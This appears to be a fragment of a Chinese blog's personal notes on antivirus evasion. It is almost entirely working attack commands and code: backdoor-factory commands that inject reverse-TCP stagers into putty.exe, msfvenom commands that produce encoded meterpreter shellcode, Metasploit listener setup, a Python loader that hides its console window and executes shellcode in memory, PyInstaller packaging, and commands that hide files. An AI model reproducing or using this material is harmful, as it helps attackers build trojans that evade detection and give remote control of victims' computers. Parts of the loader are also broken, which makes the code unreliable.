="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"> 免杀</span><br><span class="line">Backdoor-factory</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BDF 基本使用</span><br><span class="line"></span><br><span class="line">    检查二进制文件是否支持代码注入</span><br><span class="line">        backdoor-factory -f putty.exe –S</span><br><span class="line"></span><br><span class="line">    显示可用 payload</span><br><span class="line">        backdoor-factory -f putty.exe -s show</span><br><span class="line">        backdoor-factory -f which nc -s show</span><br><span class="line">        backdoor-factory -f putty.exe -s show iat_reverse_tcp_stager_threaded -H 10.10.10.133 -P 4444</span><br><span class="line">        默认单一代码洞，选项 .rdata --&gt; 查看文件 --&gt; 查病毒</span><br><span class="line">        使用 msf 侦听 set payload windows/meterpreter/revers_tcp set LHOST 10.10.10.131 set LPORT 4444 run</span><br><span class="line"></span><br><span class="line">    查看 cave 大小</span><br><span class="line">        ackdoor-factory -f putty.exe -c -l</span><br><span class="line"></span><br><span class="line">免杀效果对比</span><br><span class="line"></span><br><span class="line">    backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 1.1.1.1 -P 6666</span><br><span class="line">    backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 1.1.1.1 -P 6666 –J</span><br><span class="line">    backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 192.168.20.8 -P 6666 -a</span><br><span class="line"></span><br><span class="line"> msf &gt; use exploit/multi/handler </span><br><span class="line"> msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp </span><br><span class="line"> msf exploit(multi/handler) &gt; set LHOST 10.10.10.131 </span><br><span class="line"> msf exploit(multi/handler) &gt; set LPORT 4444 msf exploit(multi/handler) &gt; run </span><br><span class="line">--------------------- </span><br><span class="line"></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LPORT=6666 LHOST=192.168.0.105  -e x86/shikata_ga_nai -i 11 -f py -o /mo.py</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LPORT=6666 LHOST=192.168.198.149 -e x86/shikata_ga_nai -i 11 -f py -o  /opt/luomiweixiong.py</span><br><span class="line"></span><br><span class="line">pywin32_2.7(jb51.net) ,pyinstall</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LPORT=9991 LHOST=192.168.0.105  -e x86/shikata_ga_nai -i 11 -f py -o hjkl.py</span><br><span class="line"></span><br><span class="line">from ctypes import *</span><br><span class="line"></span><br><span class="line">import ctypes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#libc = CDLL(&apos;libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">PROT_READ = 1</span><br><span class="line"></span><br><span class="line">PROT_WRITE = 2</span><br><span class="line"></span><br><span class="line">PROT_EXEC = 4</span><br><span class="line"></span><br><span class="line">def executable_code(buffer):</span><br><span class="line"></span><br><span class="line">    buf = c_char_p(buffer)</span><br><span class="line"></span><br><span class="line">    size = len(buffer)</span><br><span class="line"></span><br><span class="line">    addr = libc.valloc(size)</span><br><span class="line"></span><br><span class="line">    addr = c_void_p(addr)</span><br><span class="line"></span><br><span class="line">    if 0 == addr: </span><br><span class="line"></span><br><span class="line">        raise Exception(&quot;Failed to allocate memory&quot;)</span><br><span class="line"></span><br><span class="line">    memmove(addr, buf, size)</span><br><span class="line"></span><br><span class="line">    if 0 != libc.mprotect(addr, len(buffer), PROT_READ | PROT_WRITE | PROT_EXEC):</span><br><span class="line"></span><br><span class="line">        raise Exception(&quot;Failed to set protection on buffer&quot;)</span><br><span class="line"></span><br><span class="line">    return addr</span><br><span class="line"></span><br><span class="line">VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc</span><br><span class="line"></span><br><span class="line">VirtualProtect = ctypes.windll.kernel32.VirtualProtect</span><br><span class="line"></span><br><span class="line">shellcode = bytearray(buf)</span><br><span class="line"></span><br><span class="line">whnd = ctypes.windll.kernel32.GetConsoleWindow()   </span><br><span class="line"></span><br><span class="line">if whnd != 0:</span><br><span class="line"></span><br><span class="line">       if 666==666:</span><br><span class="line"></span><br><span class="line">              ctypes.windll.user32.ShowWindow(whnd, 0)   </span><br><span class="line"></span><br><span class="line">              ctypes.windll.kernel32.CloseHandle(whnd)</span><br><span class="line"></span><br><span class="line">print &quot;..................................&quot;*666</span><br><span class="line"></span><br><span class="line">memorywithshell = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),</span><br><span class="line"></span><br><span class="line">                                          ctypes.c_int(len(shellcode)),</span><br><span class="line"></span><br><span class="line">                                          ctypes.c_int(0x3000),</span><br><span class="line"></span><br><span class="line">                                          ctypes.c_int(0x40))</span><br><span class="line"></span><br><span class="line">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line"></span><br><span class="line">old = ctypes.c_long(1)</span><br><span class="line"></span><br><span class="line">VirtualProtect(memorywithshell, ctypes.c_int(len(shellcode)),0x40,ctypes.byref(old))</span><br><span class="line"></span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(memorywithshell),</span><br><span class="line"></span><br><span class="line">                                     buf,</span><br><span class="line"></span><br><span class="line">                                     ctypes.c_int(len(shellcode)))</span><br><span class="line"></span><br><span class="line">shell = cast(memorywithshell, CFUNCTYPE(c_void_p))</span><br><span class="line"></span><br><span class="line">print &quot;Code By Jaky&quot;</span><br><span class="line"></span><br><span class="line">shell()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">python PyInstaller.py --console --onefile</span><br><span class="line"></span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">exec(&quot;..\..\..\..\..\..\..\Program Files\Mozilla Firefox\as.exe&quot;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">attrib +s +h test</span><br><span class="line">attrib -s -h test</span><br><span class="line"></span><br><span class="line">一句话木马</span><br></pre></td></tr></table></figure>
